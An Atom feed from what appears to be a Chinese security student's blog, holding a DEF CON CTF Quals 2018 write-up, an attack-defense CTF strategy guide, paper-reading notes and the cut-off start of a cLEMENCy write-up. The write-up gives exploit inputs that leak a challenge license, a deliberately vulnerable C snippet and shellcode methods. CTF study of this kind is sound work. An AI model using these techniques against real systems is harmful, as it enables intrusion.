<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>星博‘s</title>
  <subtitle>PHD的自我修养</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://windcarp.github.io/"/>
  <updated>2018-05-15T17:32:00.000Z</updated>
  <id>https://windcarp.github.io/</id>
  
  <author>
    <name>cxm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Defcon CTF Quals 2018 - Tech Support Writup and Some Challenges</title>
    <link href="https://windcarp.github.io/2018/05/16/Defcon%20CTF%20Quals%202018/"/>
    <id>https://windcarp.github.io/2018/05/16/Defcon CTF Quals 2018/</id>
    <published>2018-05-15T17:32:26.000Z</published>
    <updated>2018-05-15T17:32:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>上周末是 Defcon CTF Quals 2018的比赛，今年是更换主办方的第一年，之前都是 <strong>Legitimate Business Syndicate</strong>，比赛质量也一直很高；然而去年Defcon CTF 的五年合同到期，于是今年是新的主办方，拖了 n 久才确定的 <a href="https://www.oooverflow.io/" target="_blank" rel="external"><strong>Order of the Overflow</strong></a>。</p>
<p>大佬们一大部分来自Shellphish，例如非常眼熟的<strong>Yan Shoshitaishvili (@Zardus)</strong>。值得一提的是，他们中很多都是年轻教授，一开始还以为会搞成 Old Style 的比赛；赛前一天在 Defcon China 碰到冯老师，打听到他也参与了出题审题，瞬间感觉比赛质量有保障了。</p>
<p>今年依旧是被 <strong>Tea Delieverers</strong> 递茶队的大佬们带飞，我帮忙打下手。之前在 PCTF 中一名只差没有外卡，非常可惜，这次杨博士和各位史前巨佬们（又多又强）一起出动，很辛苦的认真怼了两天，拿到了<strong>第六名</strong>的好成绩 ~</p>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1frcgega3ksj31890ef158.jpg" alt=""></p>
<p>接下来从我的角度，列举几道 Binary 题目供大家体会题目的清奇风格。没搜到 TechSupport 的题解，于是提供一下 Writeup。</p>
<hr>
<h3 id="TechSupport"><a href="#TechSupport" class="headerlink" title="TechSupport"></a>TechSupport</h3><p><strong>TL;DR：</strong>Gdb 调试 + Patch + Info leak，难度低，有新意。</p>
<h4 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h4><p>题目给的 Binary 是一个化学分子量计算器，题目 Binary 很小，核心代码：</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1frcgqkj0tzj30k3046q3o.jpg" alt=""></p>
<p>但远程连进去是一个（伪）AI 客服问一些 SB 问题，回答完之后说你在公网监听3456端口它会连接，感觉这个形式比较有新意。连进来之后，发现是 gdb 调试命令，在本地<code>gdbserver</code>执行，然后提示 license 不对。</p>
<p><strong>接下来的所有过程就是按照主办方的引导走下去</strong>。</p>
<p>分析 <code>gdbserver</code> 流量得知，其在license检查完的函数出口下断点并执行。同时会随机上传一段 Binary 看是否打 Patch。那我们第一步，在 <code>eh_frame</code> 处 <code>patch + 跳转</code>，过了 license 的检查；于此同时开始无脑写 <code>Angr Script</code>。（后来 license 确实是 Flag，只不过 Angr 跑不出来，浪费了半天）</p>
<p>之后，客服告诉我， Crash 了才会处理。有 Binary Crash 还不容易，随便 Patch 个无效地址取，并观察 <code>gdbserver</code> 的流量，发现 Crash 后会把我的处理参数取回去执行，并返回结果他那里没有 Crash。问题就变成了，如何构造参数使远程 Crash。</p>
<p>Binary 就很小，翻了半天没有任何溢出可能，不过 Crash 还是可以的。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cal_main_element(<span class="keyword">int</span> *element_weight_stack)</div><div class="line">  ...</div><div class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"The main element is %s, which accounts for %d%% of the total weight\n"</span>, &amp;element_name[<span class="number">2</span> * idx],(<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">100</span> * max / sum));</div></pre></td></tr></table></figure>
<ol>
<li><strong><code>element_weight_stack</code>在对元素质量做统计时是直接覆盖</strong>;</li>
<li><strong><code>cal_main_element</code> 可能除0</strong>；</li>
</ol>
<p>那么我们只要在输入元素时，如 <code>./mcalc Ag5Ag0</code>，则统计结果是0。则触发 Crash，远程会告诉我们和它 Crash 时的不同，会打印如下信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#$#!!%^!!</div><div class="line">It seems like our program has crashed</div><div class="line">Just give me a second to try to reproduce the bug on our servers...</div><div class="line">I confirm that we were able to reproduce the bug on our side</div><div class="line">These are the differences in the program state at the moment it crashed:</div><div class="line">------------------------------------------------------------------------------</div><div class="line">REG              OUR SERVER                          YOUR INSTALLATION</div><div class="line">------------------------------------------------------------------------------</div><div class="line">rsi | 0x000000000001                      | 0x0000deadbeef</div><div class="line">r13 | 0x7fffffffed00 &gt; 0x0000000000000002 | 0x7fffffffe2a0 &gt; 0x0000000000000002</div><div class="line">rcx | 0x00000001a55c                      | 0x0000deadbeef</div></pre></td></tr></table></figure>
<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>走到这里只剩下一步了。当时陷入了误区，尝试继续按照客服要求，构造完全相同的 Crash 场景，结果失败。杨博士提醒说，有可能是在<strong>打印寄存器信息导致 Inforleak</strong>。查看 Crash 点的寄存器，发现，<strong>RCX</strong>寄存器中存的是我们分子量的总和，我们只需要构造分子量指向 BSS 段的 <code>License (0x6033D0)</code>即可。</p>
<p>最后一步，<strong>动态规划一下</strong>，题目所给的分子量很难直接构造精确地址，于是算法弱渣捡起 DP，构造精确值，最后得到 Flag 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#$#!!%^!!</div><div class="line">------------------------------------------------------------------------------</div><div class="line">REG              OUR SERVER                          YOUR INSTALLATION</div><div class="line">------------------------------------------------------------------------------</div><div class="line">rbx | 0x000000000000                      | 0x0000deadbeef</div><div class="line">rcx | 0x0000006033d8 &gt; 0x31345e3339252565 | 0x0000deadbeef</div><div class="line"></div><div class="line">./mcalc Fm23Au1Pr1Fm0Au0Pr0FeFe00</div><div class="line">./mcalc Fm22Cf1Tl1Er1Fm0Cf0Tl0Er0SiSi00</div><div class="line">license(flag): %%license%%93^41</div></pre></td></tr></table></figure>
<h4 id="And-Finally"><a href="#And-Finally" class="headerlink" title="And Finally"></a>And Finally</h4><p>于是，我们作为一个盗版用户，从客服手中拿到了真正的 License 23333333。难度很低，故事很有趣。</p>
<p><strong>不同于千篇一律的套路题，高质量 CTF 往往不按套路出牌，有趣也能学到东西，而不是拿已有的利用套路反复用来用去，这点值得国内的 CTF 多多学习</strong>。</p>
<p>当然，这次 CTF 也有很多值得吐槽的地方，比如浪费生命的 <strong>POW</strong>，国内都已经不多见的<strong>猜猜猜</strong>题目，体验很差，可以到<a href="https://ctftime.org/event/608" target="_blank" rel="external">CTFTime</a> 感受一下。</p>
<hr>
<h3 id="Other-Challenges"><a href="#Other-Challenges" class="headerlink" title="Other Challenges"></a>Other Challenges</h3><h4 id="Babypwn1805"><a href="#Babypwn1805" class="headerlink" title="Babypwn1805"></a>Babypwn1805</h4><p>给了几行代码，没有 Binary，提供了方便爆破的重复启动。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">char asdf[1024];</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	long long index = 0;</div><div class="line">	read(0, &amp;index, 1024);</div><div class="line">	read(0, asdf+index, 8);</div><div class="line">	read(0, &amp;index, 1024);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>利用</strong>：跳 <code>OneGadget</code>，不过做出来之后发现每次启动都会换 <code>Libc</code>。无力吐槽，不知 <code>intended solution</code> 是什么。</p>
<h4 id="Bitflipper"><a href="#Bitflipper" class="headerlink" title="Bitflipper"></a>Bitflipper</h4><p>嗯，没错，这次的题目都不喜欢给 Binary。这次的内容是修改4bit 之后帮你执行Binary，Binary 正常工作是有颜色的 ls 命令。题目可以理解为在 RowHammer 的条件下如何影响程序执行；据说 RowHarmmer 执行的条件越来越低（<a href="https://arxiv.org/abs/1710.00551" target="_blank" rel="external">Another Flip in the Wall of Rowhammer Defenses</a>）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ Which bit do you want to flip (0-81727)? 10000</div><div class="line">1 bits have been flipped</div><div class="line">MD5 of the new version: 55cb4321919e63cc65676689ba33066d</div><div class="line">Let me run the program for you now...</div><div class="line">-------------------------------------------------------</div><div class="line">[-8mREADME</div><div class="line">abc.jpg</div><div class="line">[-8mdir</div><div class="line">[-8msecret_flag.txt</div><div class="line">test.doc</div><div class="line">[-8mversion.txt</div><div class="line">-------------------------------------------------------</div></pre></td></tr></table></figure>
<p>或者，会提示想把 Crash 发给我们。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">bash: ./dir: cannot execute binary file: Exec format error</div><div class="line">-------------------------------------------------------</div><div class="line">Looks like you broke it!</div><div class="line">I would send you a core dump, but I could not find any in the current directory</div></pre></td></tr></table></figure>
<p>一开始没有思路的情况下，大家进行了惨无人道的爆破。</p>
<p><strong>利用：</strong></p>
<p>首先，通过改 Binary 头部 type 字段，将其识别为Crash 文件，如此 Dump 出 Binary。</p>
<p>接下来，修改 4 bit 影响程序的执行结果，大概思路是修改一些函数调用等关键位置的寄存器值。没有征求解题大佬的意见，不列举细节，有兴趣的同学可以考虑一下。</p>
<h4 id="Shellql"><a href="#Shellql" class="headerlink" title="Shellql"></a>Shellql</h4><p>给了 Binary 的一题，一个 php 加载的库，上次见到还是在 Pwnhub 。题目提供执行 Shellcode，Shellcode 需要完成的工作，从数据库中查询 flag，并把结果返回；当然，还需要 leak 才能完成整个过程。</p>
<h4 id="NOP"><a href="#NOP" class="headerlink" title="NOP"></a>NOP</h4><p>给了 Binary 的议题。Shellql 需要构造功能 Shellcode，这题则是经典的 Shellcode 题目，字符限制在音符中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C1 C#1 D1 D#1 ... B1 C2 C#2...B9</div></pre></td></tr></table></figure>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1frciysrcr3j312g0o6grf.jpg" alt=""></p>
<p>题目通过一个奇怪的映射把<code>0x001b - 0x67de</code>范围内的数字映射到这些音符上。在进入 Shellcode 之前，会清空所有寄存器，在栈上放上很多垃圾内容。Shellcode 位置位于<code>0x606000</code>。</p>
<p><strong>利用</strong>：</p>
<p>经典 Shellcode 题一般思路：<strong>首先</strong>看可利用的指令；如果已有指令不够用，则<strong>其次</strong>使用可利用的指令以及现场数据构造自己的地址，对Shellcode 自身进行修改；<strong>接下来</strong>构造 Read，读入真正的 Shellcode，并执行。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上周末是 Defcon CTF Quals 2018的比赛，今年是更换主办方的第一年，之前都是 &lt;strong&gt;Legitimate Business Syndicate&lt;/strong&gt;，比赛质量也一直很高；然而去年Defcon CTF 的五年合同到期，于是今年是新的主办
    
    </summary>
    
      <category term="CTF-Pwn" scheme="https://windcarp.github.io/categories/CTF-Pwn/"/>
    
    
      <category term="Pwn" scheme="https://windcarp.github.io/tags/Pwn/"/>
    
      <category term="CTF" scheme="https://windcarp.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>二进制线下赛攻防分享</title>
    <link href="https://windcarp.github.io/2018/04/13/CTF-Offline-Share/"/>
    <id>https://windcarp.github.io/2018/04/13/CTF-Offline-Share/</id>
    <published>2018-04-12T17:32:26.000Z</published>
    <updated>2018-04-13T12:05:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>这篇博客是之前在协会内部分享的内容，将介绍我在二进制线下赛攻防中的一些经历和经验，希望对入门的同学有一定的帮助。</p>
<hr>
<h3 id="1-线下赛A-amp-D模式"><a href="#1-线下赛A-amp-D模式" class="headerlink" title="1. 线下赛A&amp;D模式"></a>1. 线下赛A&amp;D模式</h3><p>Attack With Defence，比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。</p>
<p>往往线下赛中，二进制需要做的事情没有web那么复杂。最重要的是，</p>
<ul>
<li>更快的写出exp</li>
<li>更快的patch</li>
<li>通用防御以及脏套路</li>
<li>批量打出去</li>
<li>运维(检查流量与权限维持)</li>
<li>杀马，一些trick</li>
<li>策略</li>
</ul>
<p>等等。</p>
<p>接下来分模块介绍一下，在国内日常的线下赛中需要注意的点，以及最后的Timeline和一些经验。</p>
<h3 id="2-更快的写出exp"><a href="#2-更快的写出exp" class="headerlink" title="2. 更快的写出exp"></a>2. 更快的写出exp</h3><p>在攻防赛中一般出现的漏洞往往不会特别复杂，很少出现堆风水利用的题（因为太容易patch），因此<strong>栈溢出</strong>和格式化等一些简单的漏洞比较多（比较简单的比赛）.</p>
<p>如果是难一点的比赛，会出现稍为复杂的漏洞：栈未初始化（XCTF 2016中breiflyx的题目），整数溢出（Uctf final 2016 calculator）等。</p>
<p>如果有条件，可以使用Fuzz工具（afl，driller等）同时进行fuzz。</p>
<p>写exp时，按照自己的批量攻击的模板来写，而且不要使用全局变量，方便批量脚本运行。</p>
<h3 id="3-更快的Patch"><a href="#3-更快的Patch" class="headerlink" title="3. 更快的Patch"></a>3. 更快的Patch</h3><p>如果拿到一个题目没什么思路，在看完一遍binary之后还不知道漏洞在哪（一遍binary看下来大概花30分钟），那就看看有哪些明显的点可以patch。</p>
<h4 id="一般用于Patch的点："><a href="#一般用于Patch的点：" class="headerlink" title="一般用于Patch的点："></a>一般用于Patch的点：</h4><ul>
<li><p>漏洞点：可以直接在原地修改的话，尽量原地修改，如果修改不了跳到.eh.frame里面；</p>
</li>
<li><p>针对堆利用的题目，把free patch可以解决80%的问题，一般主办方不会使用memory leak的方法来检测是否patch free。当然也有一些例外，如XCTF 17 Final Xmail，这道题比较复杂的漏洞，需要利用脏数据占位才能构造整数溢出，所以在正常功能设计了堆释放验证的功能，如果Patch会被Checkdown。</p>
</li>
<li><p>针对栈溢出，可以实现一个脚本，修改所有函数的prologue和epilogue；还可以实现Binary层面的CFI等；</p>
</li>
<li><p>针对Defcon以及可以抄patch的比赛（以后应该会越来越多？），则有更多的可以实现，如patch后门等（后期补充）。</p>
</li>
</ul>
<h4 id="Patch使用的工具："><a href="#Patch使用的工具：" class="headerlink" title="Patch使用的工具："></a>Patch使用的工具：</h4><ul>
<li><p>IDA的Patch功能：手动Patch，贼慢</p>
</li>
<li><p>binch: <a href="https://github.com/tunz/binch" target="_blank" rel="external">https://github.com/tunz/binch</a></p>
<p>  一个轻量级的patch库，尚未测试</p>
</li>
<li><p>patchkit: <a href="https://github.com/lunixbochs/patchkit" target="_blank" rel="external">https://github.com/lunixbochs/patchkit</a></p>
<p>  一个重量级的patch任意函数的库，比较好用。</p>
<p>  可以提前准备的patchkit脚本：</p>
<ul>
<li>一键 free/printf patch</li>
<li>logue修改：这个稳定性可能有问题，但应该提供针对某些位置已经写好的增减问题</li>
</ul>
</li>
<li><p>patchelf：<a href="https://github.com/NixOS/patchelf" target="_blank" rel="external">https://github.com/NixOS/patchelf</a></p>
</li>
</ul>
<p>还有一些工具，后期会进行补充。</p>
<h3 id="4-通用防御以及脏套路"><a href="#4-通用防御以及脏套路" class="headerlink" title="4. 通用防御以及脏套路"></a>4. 通用防御以及脏套路</h3><p>通用防御几乎在所有的比赛中是被禁止的，因为这样比赛失去了意义。但无论是从一个<strong>负责任</strong>的主办方的角度，需要了解有哪些通防即如何检测；或者是一个队伍缺乏Bin手需要临时挡一下攻击（而且比赛规则没有明令禁止），还是派的上用场的。</p>
<blockquote>
<p><strong>我们承诺不首先使用核武器</strong></p>
</blockquote>
<h4 id="通用防御"><a href="#通用防御" class="headerlink" title="通用防御"></a>通用防御</h4><ul>
<li><p>gatekeeper: <a href="https://github.com/samuraictf/gatekeeper" target="_blank" rel="external">https://github.com/samuraictf/gatekeeper</a></p>
<p>  一个功能强大的通防套件，但很容易被发现，通过fork的方式嵌套在源文件上。</p>
</li>
<li><p>Traffic-Wrapper: (将开源)</p>
<p>  一个轻量级流量wrapper，可以过滤流量（如0x7f)</p>
</li>
<li><p>bianryWaf: <a href="https://github.com/Bluekezhou/binaryWaf" target="_blank" rel="external">https://github.com/Bluekezhou/binaryWaf</a></p>
<p>  我室友的作品，和gatekeeper功能类似。</p>
</li>
<li><p>c-proxy: （将开源）</p>
</li>
</ul>
<h3 id="5-批量打出去"><a href="#5-批量打出去" class="headerlink" title="5. 批量打出去"></a>5. 批量打出去</h3><p>在攻防赛中，批量打Exploit并统计攻击信息十分重要，如果工具的稳定性欠佳甚至会导致别人拿到你的攻击流量，比你打的分数还要高。</p>
<p>需要准备的东西有：</p>
<ul>
<li><p>批量脚本：（将开源）</p>
</li>
<li><p>Flag自动提交：（将开源）</p>
</li>
</ul>
<p>（To be finished.）</p>
<h3 id="6-运维"><a href="#6-运维" class="headerlink" title="6. 运维"></a>6. 运维</h3><p>在二进制攻防赛中，需要运维的点没有web那么多，除了web运维之外，需要做到的至少有以下几个方面。</p>
<h4 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h4><ul>
<li><p>需要备份的点有：</p>
<ul>
<li><p>刚刚登陆上的所有进程信息</p>
</li>
<li><p>所有与题目相关的binary（包括题目依赖的所有libc信息）</p>
</li>
<li><p>登录上来所有的端口信息。以及文件目录信息。</p>
</li>
<li><p>监控所有可写目录，可以查杀一些低级马。</p>
</li>
</ul>
</li>
</ul>
<h4 id="权限维持-amp-群控"><a href="#权限维持-amp-群控" class="headerlink" title="权限维持&amp;群控"></a>权限维持&amp;群控</h4><h4 id="杀马"><a href="#杀马" class="headerlink" title="杀马"></a>杀马</h4><h4 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h4><p>（To be finished.）</p>
<h3 id="7-网络等基础设施"><a href="#7-网络等基础设施" class="headerlink" title="7. 网络等基础设施"></a>7. 网络等基础设施</h3><p>（To be finished.）</p>
<h3 id="8-策略"><a href="#8-策略" class="headerlink" title="8. 策略"></a>8. 策略</h3><p>线下赛针对不同的规则策略有很多，针对题目的难易，做题的进度可以适时调整。</p>
<p>一般的线下赛人员组成配置是3-5人，一般有一个人主要负责运维，其余1-2位web手以及1-2位二进制手。</p>
<p>（To be finished.）</p>
<h3 id="9-线下赛Timeline"><a href="#9-线下赛Timeline" class="headerlink" title="9. 线下赛Timeline"></a>9. 线下赛Timeline</h3><ul>
<li><p>-2天</p>
<p>  整理思路：根据已有的规则初步分工指定策略，并准备（主要是测试）所有的工具。<strong>运维同学</strong> 还需要准备必须带过去的硬件设备。（这里不展开讲了）</p>
<p>  押题：根据已有的信息估计题目难度（如比赛时长，出题方等），熟悉一下题型。</p>
</li>
<li><p>-1天</p>
<p>  应该在路上，如果-2天没有准备好则继续准备，但不需要看新的东西，旧的东西用熟练就好，命令最好能背下来，背不下来也抄下来。</p>
<p>  去超市采购，并一定睡个好觉。</p>
</li>
<li><p>-1h</p>
<p>  至少提前一小时到达现场，<strong>运维同学</strong>和大家一起搭建好环境，仔细读一下比赛细则，配好外网环境。</p>
</li>
<li><p>1h</p>
<p>  所有同学上机器，把自己负责的题目全部备份（不止运维同学）。运维同学同时开始看web/bin题目，并在first blood打出来之后重点转移到看流量，如果发现可疑流量，第一时间通知对应同学。</p>
</li>
<li><p>之后</p>
<p>  如果题目比较难或者手速赶不上，重点可以放在看流量上。</p>
</li>
</ul>
<h4 id="针对bianry："><a href="#针对bianry：" class="headerlink" title="针对bianry："></a>针对bianry：</h4><ol>
<li>先花半个小时看binary, 不要先忙着patch。</li>
<li>如果找到漏洞点，立即写exploit，能批量打之后再打patch</li>
<li>如果有流量，看完binary的情况下优先看流量</li>
<li>如果漏洞没找到也没流量，看bianry如何patch</li>
</ol>
<h3 id="10-作为主办方"><a href="#10-作为主办方" class="headerlink" title="10. 作为主办方"></a>10. 作为主办方</h3><p>（To be finished.）</p>
<h3 id="11-一些经历"><a href="#11-一些经历" class="headerlink" title="11. 一些经历"></a>11. 一些经历</h3><p>（To be finished.）</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇博客是之前在协会内部分享的内容，将介绍我在二进制线下赛攻防中的一些经历和经验，希望对入门的同学有一定的帮助。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;1-线下赛A-amp-D模式&quot;&gt;&lt;a href=&quot;#1-线下赛A-amp-D模式&quot; class=&quot;headerlink&quot; ti
    
    </summary>
    
      <category term="CTF-Pwn" scheme="https://windcarp.github.io/categories/CTF-Pwn/"/>
    
    
      <category term="Pwn" scheme="https://windcarp.github.io/tags/Pwn/"/>
    
      <category term="CTF" scheme="https://windcarp.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>论文阅读分享</title>
    <link href="https://windcarp.github.io/2018/04/11/Academic_share/"/>
    <id>https://windcarp.github.io/2018/04/11/Academic_share/</id>
    <published>2018-04-10T17:32:26.000Z</published>
    <updated>2018-04-13T12:11:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>这篇博客会定期分享我阅读论文的笔记。</p>
<hr>
<h2 id="5-Getting-Started-at-LLVM-Yet-another-LLVM-Tutorial-实践沙龙分享"><a href="#5-Getting-Started-at-LLVM-Yet-another-LLVM-Tutorial-实践沙龙分享" class="headerlink" title="5. Getting Started at LLVM - Yet another LLVM Tutorial(实践沙龙分享)"></a>5. <strong>Getting Started at LLVM - Yet another LLVM Tutorial(实践沙龙分享)</strong></h2><p>周四晚在实验室简单分享了LLVM相关的入门知识，中间翻车无数Orz;</p>
<p>Slide里介绍了以下内容：</p>
<ul>
<li>编译器的一些背景知识</li>
<li>LLVM的设计</li>
<li>一些LLVM中重要的概念与IR语言</li>
<li>LLVM编译中的实现细节<ul>
<li>Pass与优化</li>
<li>Code Generator与SelectionDAG</li>
</ul>
</li>
<li>LLVM的引用</li>
</ul>
<p>Slide:  <a href="https://docs.google.com/presentation/d/18MS6hXvyGXJcjR5rpFFnUCNb8MYdoamrplIySchFPKM/edit?usp=sharing" target="_blank" rel="external">https://docs.google.com/presentation/d/18MS6hXvyGXJcjR5rpFFnUCNb8MYdoamrplIySchFPKM/edit?usp=sharing</a></p>
<hr>
<h2 id="4-Compiler-assisted-Code-Randomization-Oakland-18"><a href="#4-Compiler-assisted-Code-Randomization-Oakland-18" class="headerlink" title="4. Compiler-assisted Code Randomization (Oakland 18)"></a>4. <strong>Compiler-assisted Code Randomization (Oakland 18)</strong></h2><p>这篇文章是一篇基于编译器，做代码随机化的文章。</p>
<p>这篇文章的亮点是，和之前的工作相比，实现了Basic Block级的细粒度随机化，可以在Client端以很小的Overhead生成以及运行；而且和现有的软件部署系统相兼容；</p>
<p>其原理可以概述为，在编译时，收集关于程序的布局、Fixup、BasicBlock等必须的信息，在Client端使用Binary Rewriter根据这些信息，对BasicBlock进行随机排列。</p>
<p>最后作者基于LLVM和Gold plugin实现了原型系统，并取得了很低的Overhead。作者在会议后将开源原型代码。</p>
<p>Paper: <a href="https://cs.brown.edu/~vpk/papers/ccr.sp18.pdf" target="_blank" rel="external">https://cs.brown.edu/~vpk/papers/ccr.sp18.pdf</a></p>
<p>Slide: <a href="https://docs.google.com/presentation/d/1UI-VWtXwbdiEes9I41e4MMGDGmgDhrcRSyzNbUQkD4I/edit?usp=sharing" target="_blank" rel="external">https://docs.google.com/presentation/d/1UI-VWtXwbdiEes9I41e4MMGDGmgDhrcRSyzNbUQkD4I/edit?usp=sharing</a></p>
<hr>
<h2 id="3-Address-Oblivious-Code-Reuse-On-the-Effectiveness-of-Leakage-Resilient-Diversity-NDSS17"><a href="#3-Address-Oblivious-Code-Reuse-On-the-Effectiveness-of-Leakage-Resilient-Diversity-NDSS17" class="headerlink" title="3. Address-Oblivious Code Reuse: On the Effectiveness of Leakage-Resilient Diversity (NDSS17)"></a>3. <strong>Address-Oblivious Code Reuse: On the Effectiveness of Leakage-Resilient Diversity (NDSS17)</strong></h2><p>这篇文章来自于MIT的Lincoln实验室，发表在今年的NDSS17上。这篇文章讲述的是针对防御Code Reuse方式的攻击，主要针对Execute Only，提出了一种新的利用方法AOCR(Address Oblivious Code Reuse)，这种方法可以绕过绝大多数的防御。</p>
<p>AOCR的攻击简单概括分两步：</p>
<ol>
<li>找到Indirect code pointer和函数的对应关系</li>
<li>通过Malicious Loop Redirection将找到的Code pointer进行Chaining并调用，完成操作</li>
</ol>
<p>这篇文章最后给出了Nginx和Apache的实际漏洞的利用（未放出代码），并绕过了绝大多数的防御措施。</p>
<p>Paper：<a href="https://www.ics.uci.edu/~perl/ndss17_aocr.pdf" target="_blank" rel="external">https://www.ics.uci.edu/~perl/ndss17_aocr.pdf</a></p>
<p>Slide: <a href="https://docs.google.com/presentation/d/1fQOzVHJlcpfsPokgQwLm45qBis1P4qX532JWbi89bgA/edit?usp=sharing" target="_blank" rel="external">https://docs.google.com/presentation/d/1fQOzVHJlcpfsPokgQwLm45qBis1P4qX532JWbi89bgA/edit?usp=sharing</a></p>
<hr>
<h2 id="2-Cyber-Grand-Shellphish-Phrank"><a href="#2-Cyber-Grand-Shellphish-Phrank" class="headerlink" title="2. Cyber Grand Shellphish (Phrank)"></a>2. <strong>Cyber Grand Shellphish (Phrank)</strong></h2><p>本篇叙述了Shellphish在Cyber Grand Challenge中做的一些工作，原文首发于phrank (<a href="http://phrack.org/papers/cyber_grand_shellphish.html)。" target="_blank" rel="external">http://phrack.org/papers/cyber_grand_shellphish.html)。</a></p>
<p>为了方便阅读，故对其进行了重排版，并添加了一些阅读笔记在Google doc里面。</p>
<p>Doc: <a href="https://docs.google.com/document/d/1D5TC2j8gWF6H6kO_me1Qo4Qo3EdR03Rvt7mfFcReR8Q/edit?usp=sharing" target="_blank" rel="external">https://docs.google.com/document/d/1D5TC2j8gWF6H6kO_me1Qo4Qo3EdR03Rvt7mfFcReR8Q/edit?usp=sharing</a></p>
<hr>
<h2 id="1-SemFuzz-Semantics-based-Automatic-Generation-of-Proof-of-Concept-Exploits-CCS-17"><a href="#1-SemFuzz-Semantics-based-Automatic-Generation-of-Proof-of-Concept-Exploits-CCS-17" class="headerlink" title="1. SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits (CCS 17)"></a>1. <strong>SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits (CCS 17)</strong></h2><p>本篇发表在最新的CCS 2017上，其工作主要是，基于linux kernel，采集CVE和git log中隐含的漏洞信息，通过自然语言处理进行分析，并使用Fuzz的手段（粗粒度和细粒度），产生能运行到漏洞函数的POC exploit。</p>
<p>最终的效果是在满足条件的122个CVE里成功产生了18个Poc，并顺便发现了一个0day和一个Undisclosed漏洞。</p>
<p>本篇的作者来自信工所、Indiana与人民大学，一作是Wei You，二作是Peiyuan Zong。</p>
<p>这篇论文是我在实验室的大组会上分享的，在深圳有同学也想参加，于是斗鱼上来了一次学术直播，之后学长告诉我这篇文章的作者小姐姐看了我的直播。第一次体验了主播的感觉，非常有趣，纪念一下，哈哈~</p>
<p>Slide: <a href="https://docs.google.com/presentation/d/1v223Vvh8rmf6Fk5mjVb5uaJ7FnTYYi0XFs9-iypjP3k/edit?usp=sharing" target="_blank" rel="external">https://docs.google.com/presentation/d/1v223Vvh8rmf6Fk5mjVb5uaJ7FnTYYi0XFs9-iypjP3k/edit?usp=sharing</a></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇博客会定期分享我阅读论文的笔记。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;5-Getting-Started-at-LLVM-Yet-another-LLVM-Tutorial-实践沙龙分享&quot;&gt;&lt;a href=&quot;#5-Getting-Started-at-LLVM-Yet-a
    
    </summary>
    
      <category term="Academic" scheme="https://windcarp.github.io/categories/Academic/"/>
    
    
      <category term="Paper" scheme="https://windcarp.github.io/tags/Paper/"/>
    
  </entry>
  
  <entry>
    <title>Pwnhub 线下沙龙CTF之cLEMENCy题解</title>
    <link href="https://windcarp.github.io/2017/08/14/Writeup/"/>
    <id>https://windcarp.github.io/2017/08/14/Writeup/</id>
    <published>2017-08-14T07:27:12.000Z</published>
    <updated>2018-03-23T06:01:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>8月12日Pwnhub第一次沙龙，心想到要和一众大佬面基，心情异常激动，于是攥着讨来的邀请函，冒着12级大雨，满心欢喜的赶到了五环的小别墅~</p>
<p>上午的议题干货满满，有冠城大佬，360小姐姐和青博学弟flyyy的分享，中午的<strong>烧烤 + 德州扑克</strong>之后便是Pwnhub的经典项目CTF，其中Explorer大佬出了一道<code>cLEMENCy</code>架构的题目。</p>
